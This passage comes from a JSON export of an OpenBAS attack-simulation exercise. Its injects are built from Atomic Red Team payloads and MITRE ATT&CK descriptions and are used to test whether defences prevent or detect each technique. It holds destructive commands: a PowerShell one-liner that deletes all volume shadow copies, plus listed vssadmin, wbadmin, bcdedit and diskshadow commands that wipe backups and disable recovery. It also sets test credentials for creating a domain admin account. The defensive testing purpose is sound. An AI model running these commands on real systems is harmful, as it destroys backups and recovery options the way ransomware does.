Alternatively, they may add new directories to an endpoint detection and response (EDR) tool’s exclusion list, enabling them to hide malicious files via [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012).(Citation: BlackBerry WhisperGate 2022)(Citation: Google Cloud Threat Intelligence FIN13 2021)\n\nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
        "attack_pattern_external_id" : "T1562.001",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "92c4f727-b17e-4641-825d-ac5e3bc97527",
          "phase_external_id" : "TA0005",
          "phase_stix_id" : "x-mitre-tactic--78b23412-0651-46d7-a540-170a1ce8bd5a",
          "phase_name" : "Defense Evasion",
          "phase_shortname" : "defense-evasion",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
          "phase_order" : 6
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "a802b8cf-8623-4095-a0e4-9768522d8577",
    "inject_title" : "Windows - Delete Volume Shadow Copies via WMI with PowerShell",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 1860,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Windows - Delete Volume Shadow Copies via WMI with PowerShell",
          "fr" : "Windows - Delete Volume Shadow Copies via WMI with PowerShell"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "0a21128a-8009-4a13-8dfd-d28ada9a2a80",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "0a21128a-8009-4a13-8dfd-d28ada9a2a80",
      "injector_contract_labels" : {
        "en" : "Windows - Delete Volume Shadow Copies via WMI with PowerShell",
        "fr" : "Windows - Delete Volume Shadow Copies via WMI with PowerShell"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Windows - Delete Volume Shadow Copies via WMI with PowerShell\",\"fr\":\"Windows - Delete Volume Shadow Copies via WMI with PowerShell\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"0a21128a-8009-4a13-8dfd-d28ada9a2a80\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "f471eac8-d793-4acc-87a7-ebae30dd3044",
        "payload_type" : "Command",
        "payload_name" : "Windows - Delete Volume Shadow Copies via WMI with PowerShell",
        "payload_description" : "Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.\nThis technique is used by numerous ransomware families such as Sodinokibi/REvil.\nExecutes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution\nthere may be no output displayed.\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "26961f3e-ad00-4176-85c2-d9b014dc0396",
          "attack_pattern_name" : "Inhibit System Recovery",
          "attack_pattern_description" : "Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.\n\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Furthermore, adversaries may disable recovery notifications, then corrupt backups.(Citation: disable_notif_synology_ransom)\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system\n* <code>diskshadow.exe</code> can be used to delete all volume shadow copies on a system - <code>diskshadow delete shadows all</code> (Citation: Diskshadow) (Citation: Crytox Ransomware)\n\nOn network devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561) to delete backup firmware images and reformat the file system, then [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\n\nOn ESXi servers, adversaries may delete or encrypt snapshots of virtual machines to support [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486), preventing them from being leveraged as backups (e.g., via ` vim-cmd vmsvc/snapshot.removeall`).(Citation: Cybereason)\n\nAdversaries may also delete “online” backups that are connected to their network – whether via network storage media or through folders that sync to cloud services.(Citation: ZDNet Ransomware Backups 2020) In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, database backups, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.(Citation: Dark Reading Code Spaces Cyber Attack)(Citation: Rhino Security Labs AWS S3 Ransomware)",
          "attack_pattern_external_id" : "T1490",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "dc8b2833-11ea-45e6-93f9-bb5f5d45f17c",
            "phase_external_id" : "TA0040",
            "phase_stix_id" : "x-mitre-tactic--5569339b-94c2-49ee-afb3-2222936582c8",
            "phase_name" : "Impact",
            "phase_shortname" : "impact",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to manipulate, interrupt, or destroy your systems and data.\n \nImpact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. In some cases, business processes can look fine, but may have been altered to benefit the adversaries’ goals. These techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach.",
            "phase_order" : 13
          } ]
        } ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : true,
        "payload_arguments" : [ ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : "39a295ca-7059-4a88-86f6-09556c1211e7",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:52.170744Z",
        "payload_updated_at" : "2025-07-03T14:51:17.998863Z",
        "command_executor" : "psh",
        "command_content" : "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:52.183615Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:52.183615Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "26961f3e-ad00-4176-85c2-d9b014dc0396",
        "attack_pattern_name" : "Inhibit System Recovery",
        "attack_pattern_description" : "Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.\n\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Furthermore, adversaries may disable recovery notifications, then corrupt backups.(Citation: disable_notif_synology_ransom)\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system\n* <code>diskshadow.exe</code> can be used to delete all volume shadow copies on a system - <code>diskshadow delete shadows all</code> (Citation: Diskshadow) (Citation: Crytox Ransomware)\n\nOn network devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561) to delete backup firmware images and reformat the file system, then [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\n\nOn ESXi servers, adversaries may delete or encrypt snapshots of virtual machines to support [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486), preventing them from being leveraged as backups (e.g., via ` vim-cmd vmsvc/snapshot.removeall`).(Citation: Cybereason)\n\nAdversaries may also delete “online” backups that are connected to their network – whether via network storage media or through folders that sync to cloud services.(Citation: ZDNet Ransomware Backups 2020) In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, database backups, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.(Citation: Dark Reading Code Spaces Cyber Attack)(Citation: Rhino Security Labs AWS S3 Ransomware)",
        "attack_pattern_external_id" : "T1490",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "dc8b2833-11ea-45e6-93f9-bb5f5d45f17c",
          "phase_external_id" : "TA0040",
          "phase_stix_id" : "x-mitre-tactic--5569339b-94c2-49ee-afb3-2222936582c8",
          "phase_name" : "Impact",
          "phase_shortname" : "impact",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to manipulate, interrupt, or destroy your systems and data.\n \nImpact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. In some cases, business processes can look fine, but may have been altered to benefit the adversaries’ goals. These techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach.",
          "phase_order" : 13
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "6b467029-e793-47a2-9a3e-a341ee9a982e",
    "inject_title" : "Create a new Domain Account using PowerShell",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ],
      "username" : "T1136.002_Admin",
      "password" : "T1136_pass123!"
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 1200,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Create a new Domain Account using PowerShell",
          "fr" : "Create a new Domain Account using PowerShell"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        }, {
          "key" : "username",
          "label" : "username",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "T1136.002_Admin",
          "type" : "text"
        }, {
          "key" : "password",
          "label" : "password",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "T1136_pass123!",
          "type" : "text"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "b19122b2-38fe-4982-8701-4902e100fd99",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "b19122b2-38fe-4982-8701-4902e100fd99",
      "injector_contract_labels" : {
        "en" : "Create a new Domain Account using PowerShell",
        "fr" : "Create a new Domain Account using PowerShell"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Create a new Domain Account using PowerShell\",\"fr\":\"Create a new Domain Account using PowerShell\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 